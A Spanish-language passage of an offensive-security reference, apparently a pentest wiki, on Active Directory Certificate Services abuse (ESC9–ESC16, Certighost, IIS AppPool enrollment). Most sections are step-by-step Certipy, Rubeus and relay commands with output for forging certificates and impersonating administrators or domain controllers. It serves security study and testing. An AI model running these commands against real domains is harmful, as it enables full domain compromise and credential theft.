A continuación, se puede emplear una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para forzar la autenticación. Al tratarse de domain controllers, es necesario especificar `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Sin extensión de seguridad - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicación

El nuevo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, denominado ESC9, impide la inclusión de la **nueva extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`** en un certificado. Este flag adquiere relevancia cuando `StrongCertificateBindingEnforcement` está establecido en `1` (la configuración predeterminada), en contraste con una configuración de `2`. Su relevancia aumenta en escenarios donde se podría explotar un mapeo de certificados más débil para Kerberos o Schannel (como en ESC10), dado que la ausencia de ESC9 no modificaría los requisitos.<sup>[[7]](#references)</sup>

Las condiciones bajo las cuales la configuración de este flag se vuelve significativa incluyen:

- `StrongCertificateBindingEnforcement` no está ajustado a `2` (el valor predeterminado es `1`), o `CertificateMappingMethods` incluye el flag `UPN`.
- El certificado está marcado con el flag `CT_FLAG_NO_SECURITY_EXTENSION` dentro de la configuración de `msPKI-Enrollment-Flag`.
- El certificado especifica cualquier EKU de autenticación de cliente.
- Se dispone de permisos `GenericWrite` sobre cualquier cuenta para comprometer otra.

### Escenario de abuso

Supongamos que `John@corp.local` tiene permisos `GenericWrite` sobre `Jane@corp.local`, con el objetivo de comprometer `Administrator@corp.local`. La plantilla de certificado `ESC9`, en la que `Jane@corp.local` tiene permitido inscribirse, está configurada con el flag `CT_FLAG_NO_SECURITY_EXTENSION` en su configuración de `msPKI-Enrollment-Flag`.

Inicialmente, se obtiene el hash de `Jane` mediante Shadow Credentials, gracias al `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo intencionadamente la parte del dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Esta modificación no infringe las restricciones, dado que `Administrator@corp.local` sigue siendo distinto del `userPrincipalName` de `Administrator`.

A continuación, se solicita como `Jane` la plantilla de certificado `ESC9`, marcada como vulnerable:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Se observa que el `userPrincipalName` del certificado refleja `Administrator`, sin ningún “object SID”.

A continuación, el `userPrincipalName` de `Jane` se revierte al original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Intentar la autenticación con el certificado emitido ahora devuelve el hash NT de `Administrator@corp.local`. El comando debe incluir `-domain <domain>` debido a que el certificado no especifica el dominio:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Mapeos de certificados débiles - ESC10

### Explicación

ESC10 hace referencia a dos valores de claves del registro en el controlador de dominio:

- El valor predeterminado de `CertificateMappingMethods` en `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` es `0x18` (`0x8 | 0x10`), anteriormente establecido en `0x1F`.
- La configuración predeterminada de `StrongCertificateBindingEnforcement` en `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` es `1`, anteriormente `0`.<sup>[[7]](#references)</sup>

**Caso 1**

Cuando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Caso 2**

Si `CertificateMappingMethods` incluye el bit `UPN` (`0x4`).

### Abuso del caso 1

Con `StrongCertificateBindingEnforcement` configurado como `0`, una cuenta A con permisos `GenericWrite` puede explotarse para comprometer cualquier cuenta B.

Por ejemplo, si se tienen permisos `GenericWrite` sobre `Jane@corp.local`, el atacante intenta comprometer `Administrator@corp.local`. El procedimiento es similar al de ESC9, lo que permite utilizar cualquier plantilla de certificado.

Inicialmente, se obtiene el hash de `Jane` mediante Shadow Credentials, aprovechando `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo deliberadamente la parte `@corp.local` para evitar una violación de restricciones.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
A continuación, se solicita como `Jane` un certificado que habilita la autenticación de cliente mediante la plantilla predeterminada `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se revierte entonces a su valor original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
La autenticación con el certificado obtenido permitirá obtener el hash NT de `Administrator@corp.local`, por lo que será necesario especificar el dominio en el comando debido a la ausencia de información del dominio en el certificado.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de abuso 2

Con `CertificateMappingMethods` conteniendo el indicador de bits `UPN` (`0x4`), una cuenta A con permisos `GenericWrite` puede comprometer cualquier cuenta B que carezca de la propiedad `userPrincipalName`, incluidas las cuentas de máquina y la cuenta de administrador de dominio integrada `Administrator`.

En este caso, el objetivo es comprometer `DC$@corp.local`, comenzando por obtener el hash de `Jane` mediante Shadow Credentials y aprovechando `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
El `userPrincipalName` de `Jane` se establece entonces en `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Se solicita un certificado para la autenticación de cliente como `Jane` utilizando la plantilla predeterminada `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se revierte a su valor original después de este proceso.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticarse mediante Schannel, se utiliza la opción `-ldap-shell` de Certipy, lo que indica que la autenticación fue exitosa como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
A través del shell LDAP, comandos como `set_rbcd` permiten realizar ataques de Resource-Based Constrained Delegation (RBCD), lo que potencialmente puede comprometer el controlador de dominio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Esta vulnerabilidad también se extiende a cualquier cuenta de usuario que carezca de un `userPrincipalName` o cuyo valor no coincida con `sAMAccountName`, siendo el `Administrator@corp.local` predeterminado un objetivo principal debido a sus privilegios LDAP elevados y a la ausencia de un `userPrincipalName` de forma predeterminada.

## Relaying NTLM to ICPR - ESC11

### Explicación

Si el CA Server no está configurado con `IF_ENFORCEENCRYPTICERTREQUEST`, pueden realizarse ataques de NTLM relay sin firma mediante el servicio RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Puedes usar `certipy` para enumerar si `Enforce Encryption for Requests` está deshabilitado; certipy mostrará las vulnerabilidades `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Escenario de abuso

Es necesario configurar un relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para los controladores de dominio, debemos especificar `-template` en DomainController.

O usando el fork de impacket de [sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Acceso de shell a una CA de ADCS con YubiHSM - ESC12

### Explicación

Los administradores pueden configurar la Certificate Authority para almacenarla en un dispositivo externo como el "Yubico YubiHSM2".

Si el dispositivo USB está conectado al servidor de la CA mediante un puerto USB, o mediante un servidor de dispositivos USB en caso de que el servidor de la CA sea una máquina virtual, se requiere una clave de autenticación (a veces denominada "contraseña") para que el Key Storage Provider genere y utilice claves en el YubiHSM.

Esta clave/contraseña se almacena en el registro, en `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`, en texto plano.

Referencia [aquí](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Escenario de abuso

Si la clave privada de la CA está almacenada en un dispositivo USB físico y obtienes acceso de shell, es posible recuperar la clave.

Primero, debes obtener el certificado de la CA (es público) y, a continuación:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finally, usa el comando `-sign` de certutil para falsificar un nuevo certificado arbitrario usando el certificado de la CA y su clave privada.

## OID Group Link Abuse - ESC13

### Explicación

El atributo `msPKI-Certificate-Policy` permite añadir la política de emisión a la plantilla de certificados. Los objetos `msPKI-Enterprise-Oid`, responsables de emitir políticas, pueden descubrirse en el Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) del contenedor de PKI OID. Una política puede vincularse a un grupo de AD mediante el atributo `msDS-OIDToGroupLink` de este objeto, lo que permite a un sistema autorizar a un usuario que presenta el certificado como si fuera miembro del grupo. [Referencia aquí](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

En otras palabras, cuando un usuario tiene permiso para inscribirse en un certificado y el certificado está vinculado a un grupo OID, el usuario puede heredar los privilegios de este grupo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Escenario de abuso

Busca un permiso de usuario mediante `certipy find` o `Certify.exe find /showAllPermissions`.

Si `John` tiene permiso para inscribirse en `VulnerableTemplate`, el usuario puede heredar los privilegios del grupo `VulnerableGroup`.

Solo tiene que especificar la plantilla y obtendrá un certificado con derechos `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuración vulnerable de renovación de certificados- ESC14

### Explicación

La descripción en https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping es notablemente exhaustiva. A continuación se incluye una cita del texto original.<sup>[[14]](#references)</sup>

ESC14 aborda las vulnerabilidades derivadas del "weak explicit certificate mapping", principalmente mediante el uso indebido o la configuración insegura del atributo `altSecurityIdentities` en cuentas de usuario o equipo de Active Directory. Este atributo multivalor permite a los administradores asociar manualmente certificados X.509 con una cuenta de AD para fines de autenticación. Cuando se completa, estos mapeos explícitos pueden anular la lógica predeterminada de mapeo de certificados, que normalmente depende de los UPN o nombres DNS presentes en el SAN del certificado, o del SID incluido en la extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`.

Un mapeo "débil" ocurre cuando el valor de cadena utilizado dentro del atributo `altSecurityIdentities` para identificar un certificado es demasiado amplio, fácil de adivinar, depende de campos de certificado no únicos o utiliza componentes del certificado fáciles de suplantar. Si un atacante puede obtener o crear un certificado cuyos atributos coincidan con un mapeo explícito débilmente definido para una cuenta privilegiada, puede utilizar dicho certificado para autenticarse como esa cuenta y suplantarla.

Algunos ejemplos de cadenas de mapeo potencialmente débiles de `altSecurityIdentities` incluyen:

- Mapeo únicamente mediante un Subject Common Name (CN) común: por ejemplo, `X509:<S>CN=SomeUser`. Un atacante podría obtener un certificado con este CN desde una fuente menos segura.
- Uso de Issuer Distinguished Names (DN) o Subject DNs demasiado genéricos sin una calificación adicional, como un número de serie específico o un identificador de clave del sujeto: por ejemplo, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Uso de otros patrones predecibles o identificadores no criptográficos que un atacante podría satisfacer en un certificado que pueda obtener legítimamente o falsificar (si ha comprometido una CA o ha encontrado una plantilla vulnerable como en ESC1).

El atributo `altSecurityIdentities` admite varios formatos de mapeo, como:

- `X509:<I>IssuerDN<S>SubjectDN` (mapea mediante el Issuer y Subject DN completos)
- `X509:<SKI>SubjectKeyIdentifier` (mapea mediante el valor de la extensión Subject Key Identifier del certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapea mediante el número de serie, calificado implícitamente por el Issuer DN); este no es un formato estándar, normalmente es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapea mediante un nombre RFC822, normalmente una dirección de correo electrónico, del SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapea mediante un hash SHA1 de la clave pública sin procesar del certificado; generalmente es robusto)

La seguridad de estos mapeos depende en gran medida de la especificidad, unicidad y solidez criptográfica de los identificadores de certificado elegidos en la cadena de mapeo. Incluso con modos de vinculación fuerte de certificados habilitados en los Domain Controllers (que afectan principalmente a los mapeos implícitos basados en los UPN/DNS del SAN y en la extensión SID), una entrada de `altSecurityIdentities` configurada incorrectamente aún puede proporcionar una vía directa para la suplantación si la propia lógica de mapeo es defectuosa o demasiado permisiva.
### Escenario de abuso

ESC14 tiene como objetivo los **explicit certificate mappings** en Active Directory (AD), específicamente el atributo `altSecurityIdentities`. Si este atributo está configurado (por diseño o por una configuración incorrecta), los atacantes pueden suplantar cuentas presentando certificados que coincidan con el mapeo.

#### Escenario A: El atacante puede escribir en `altSecurityIdentities`

**Precondición**: El atacante tiene permisos de escritura sobre el atributo `altSecurityIdentities` de la cuenta objetivo o tiene permiso para concederlo mediante uno de los siguientes permisos sobre el objeto AD objetivo:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Escenario B: El objetivo tiene un mapeo débil mediante X509RFC822 (Email)

- **Precondición**: El objetivo tiene un mapeo X509RFC822 débil en altSecurityIdentities. Un atacante puede establecer el atributo mail de la víctima para que coincida con el nombre X509RFC822 del objetivo, inscribir un certificado como la víctima y utilizarlo para autenticarse como el objetivo.
#### Escenario C: El objetivo tiene un mapeo X509IssuerSubject

- **Precondición**: El objetivo tiene un mapeo explícito X509IssuerSubject débil en `altSecurityIdentities`.El atacante puede establecer el atributo `cn` o `dNSHostName` de un principal víctima para que coincida con el sujeto del mapeo X509IssuerSubject del objetivo. A continuación, el atacante puede inscribir un certificado como la víctima y utilizarlo para autenticarse como el objetivo.
#### Escenario D: El objetivo tiene un mapeo X509SubjectOnly

- **Precondición**: El objetivo tiene un mapeo explícito X509SubjectOnly débil en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` de un principal víctima para que coincida con el sujeto del mapeo X509SubjectOnly del objetivo. A continuación, el atacante puede inscribir un certificado como la víctima y utilizarlo para autenticarse como el objetivo.
### operaciones concretas
#### Escenario A

Solicitar un certificado de la plantilla de certificado `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Guardar y convertir el certificado
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticarse (mediante el certificado)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Limpieza (opcional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Para conocer métodos de ataque más específicos en diversos escenarios de ataque, consulta lo siguiente: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explicación

La descripción disponible en https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc es extraordinariamente detallada. A continuación se incluye una cita del texto original.<sup>[[15]](#references)</sup>

Mediante el uso de plantillas de certificados predeterminadas integradas de la versión 1, un atacante puede crear un CSR que incluya application policies con prioridad sobre los atributos de Extended Key Usage configurados y especificados en la plantilla. El único requisito son permisos de enrollment, y puede utilizarse para generar certificados de autenticación de cliente, agente de solicitud de certificados y firma de código mediante la plantilla **_WebServer_**

### Abuso

La [documentación de escalada de privilegios de Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contiene ejemplos de uso más detallados.<sup>[[14]](#references)</sup>


El comando `find` de Certipy puede ayudar a identificar plantillas V1 potencialmente susceptibles a ESC15 si la CA no está parcheada.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Escenario A: Suplantación directa mediante Schannel

**Paso 1: Solicitar un certificado, inyectando la directiva de aplicación "Client Authentication" y el UPN objetivo.** El atacante `attacker@corp.local` apunta a `administrator@corp.local` utilizando la plantilla "WebServer" V1 (que permite un subject proporcionado por el enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: La plantilla V1 vulnerable con "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inyecta el OID `1.3.6.1.5.5.7.3.2` en la extensión Application Policies del CSR.
- `-upn 'administrator@corp.local'`: Establece el UPN en el SAN para la suplantación.

**Paso 2: Autenticarse mediante Schannel (LDAPS) usando el certificado obtenido.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Escenario B: Impersonación mediante PKINIT/Kerberos a través del abuso de Enrollment Agent

**Paso 1: Solicitar un certificado desde una plantilla V1 (con "Enrollee supplies subject"), inyectando la Application Policy "Certificate Request Agent".** Este certificado es para que el atacante (`attacker@corp.local`) se convierta en un agente de inscripción. No se especifica ningún UPN para la identidad propia del atacante aquí, ya que el objetivo es obtener la capacidad de agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Inyecta el OID `1.3.6.1.4.1.311.20.2.1`.

**Paso 2: Usa el certificado de "agent" para solicitar un certificado en nombre de un usuario privilegiado objetivo.** Este es un paso similar a ESC3, que utiliza el certificado del Paso 1 como certificado de agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Paso 3: Autenticarse como el usuario privilegiado usando el certificado "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Extensión de seguridad deshabilitada en la CA (globalmente)-ESC16

### Explicación

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** se refiere al escenario en el que, si la configuración de AD CS no exige la inclusión de la extensión **szOID_NTDS_CA_SECURITY_EXT** en todos los certificados, un atacante puede aprovecharlo para:

1. Solicitar un certificado **sin vinculación al SID**.

2. Usar este certificado **para autenticarse como cualquier cuenta**, por ejemplo, suplantando una cuenta con privilegios elevados (como un Domain Administrator).

También puedes consultar este artículo para obtener más información sobre el principio detallado:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuso

A continuación se hace referencia a [este enlace](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),haz clic para ver métodos de uso más detallados.<sup>[[14]](#references)</sup>

Para identificar si el entorno de Active Directory Certificate Services (AD CS) es vulnerable a **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Paso 1: Leer el UPN inicial de la cuenta víctima (opcional, para restaurarlo).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Paso 2: Actualiza el UPN de la cuenta víctima al `sAMAccountName` del administrador objetivo.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Paso 3: (Si es necesario) Obtener credenciales para la cuenta "víctima" (p. ej., mediante Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Paso 4: Solicita un certificado como el usuario _víctima_ desde _cualquier plantilla adecuada de autenticación de cliente_ (por ejemplo, "User") en la CA vulnerable a ESC16.** Debido a que la CA es vulnerable a ESC16, omitirá automáticamente la extensión de seguridad SID del certificado emitido, independientemente de la configuración específica de la plantilla para esta extensión. Establece la variable de entorno de la caché de credenciales de Kerberos (comando de shell):
```bash
export KRB5CCNAME=victim.ccache
```
A continuación, solicita el certificado:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Paso 5: Revierte el UPN de la cuenta "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Paso 6: Autentícate como el administrador objetivo.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Sustitución de identidad en callback de persecución Rogue LDAP/LSA (Certighost / CVE-2026-54121)

### Explicación

**Certighost** abusa de una **ruta de persecución / callback de enrollment de AD CS** en la que la CA confía en los atributos de solicitud proporcionados por el solicitante para resolver la identidad que debe incluirse en el certificado emitido. En el PoC público, la solicitud manipulada incluye:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP controlado por el atacante al que se conectará la CA
- **`rmd`**: el **nombre DNS del Domain Controller objetivo** que se quiere suplantar

Si la CA sigue esa persecución, se conectará al atacante mediante **SMB/LSA (`445`)** y **LDAP (`389`)**. El atacante utiliza una **cuenta de equipo real** (normalmente creada mediante el **`ms-DS-MachineAccountQuota`** predeterminado), de modo que la sesión del callback se autentica como una entidad válida del dominio, pero los servicios rogue devuelven en su lugar los atributos de identidad del **DC objetivo**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Si la CA **no vincula criptográficamente la identidad devuelta con la entidad autenticada del callback**, puede emitir un certificado para el **Domain Controller**, aunque la sesión se haya autenticado mediante la cuenta de equipo controlada por el atacante. Esto hace que el fallo sea conceptualmente diferente de **Certifried**: en lugar de reescribir atributos de AD como `dNSHostName`, el atacante **sustituye los datos de identidad durante la resolución del callback de la CA**.<sup>[[2]](#references)</sup>

**Precondiciones útiles:**

- **Credenciales de dominio** con pocos privilegios
- Capacidad para **crear o reutilizar una cuenta de equipo**
- Conectividad de red desde la **CA** hacia los **puertos `389` y `445`** controlados por el atacante
- Ruta de solicitud de la CA vulnerable / sin parchear (la actualización de Microsoft del **14 de julio de 2026** añadió la **validación del DC para `cdc`** y una **comparación del SID resuelto**)

El **`.pfx`** resultante puede utilizarse para **PKINIT**, generando un **`.ccache`** y, en el flujo del PoC publicado, el **hash NT del DC objetivo**, lo que normalmente basta para lograr un **compromiso total del dominio**.

### Abuso

El PoC público automatiza toda la cadena:<sup>[[1]](#references)</sup>

1. Crear o reutilizar una **cuenta de equipo** controlada por el atacante.
2. Iniciar **listeners LDAP y SMB/LSA rogue** en `389` y `445`.
3. Enviar una solicitud de certificado que contenga los atributos **`cdc`** controlados por el atacante y **`rmd`** del objetivo.
4. Permitir que la CA se autentique en los listeners rogue mediante la cuenta de equipo controlada, pero responder a las búsquedas de identidad con los atributos del **DC objetivo**.
5. Recibir un **certificado de DC** firmado por la CA y utilizarlo para **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Flags útiles en runtime del PoC:

- `--listener <ip>`: elige explícitamente la IP de callback anunciada en `cdc`
- `--computer-name <NAME$>`: reutiliza una cuenta de máquina existente en lugar de crear una nueva

**Notas operativas:**

- El PoC necesita **root** porque enlaza los **puertos privilegiados** `389` y `445`.
- Una explotación exitosa escribe localmente un **DC `.pfx`** y un **Kerberos `.ccache`**.
- Como el certificado se asigna a una **cuenta de Domain Controller**, las acciones posteriores pueden incluir **autenticación Kerberos basada en certificados**, **DCSync** y la reutilización del **hash NT de máquina** recuperado.<sup>[[2]](#references)</sup>

## Inscripción de IIS AppPool a Administrator del mismo host

Un pool de IIS ejecutándose como `ApplicationPoolIdentity` usa la **cuenta de equipo** de su host para acceder a recursos de red salientes. Por lo tanto, la ejecución de código como `IIS AppPool\<POOL>` permanece con pocos privilegios en el token local, pero puede enviar una solicitud de AD CS que la CA autentica como `HOST$`; esto es una transición de identidad saliente, no una suplantación de token ni una escalada local al estilo Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Esta cadena requiere un host IIS unido al dominio, una Enterprise CA accesible mediante RPC, una plantilla de autenticación de máquina publicada para la que el equipo tenga permisos de inscripción, compatibilidad con PKINIT y accesibilidad a KDC/SMB. Una identidad de pool personalizada cambia el principal saliente, así que confirma que el pool realmente usa `ApplicationPoolIdentity` antes de asumir `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Inscripción con una clave controlada por el atacante

Genera el par de claves y la CSR fuera del servidor IIS y conserva la clave privada. Envía **solo la CSR** desde el worker comprometido. El [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancia `CertificateAuthority.Request`, establece `CertificateTemplate:Machine`, llama a `ICertRequest::Submit` y devuelve el certificado emitido. Usa la cadena de configuración de la CA `CAHOST\CA-NAME`; una plantilla normal `Machine` construye el subject a partir de AD, por lo que no se requieren datos de subject/SAN proporcionados por el requester.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Combina el certificado devuelto con la **clave conservada correspondiente**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` solo funciona cuando Windows ya puede asociar el certificado con una clave privada accesible; para archivos PEM separados, crea PKCS#12 explícitamente:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
Usa el PFX para PKINIT y conserva el TGT del equipo devuelto como base64 en lugar de inyectarlo inmediatamente:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self plus sustitución de servicio en el mismo host

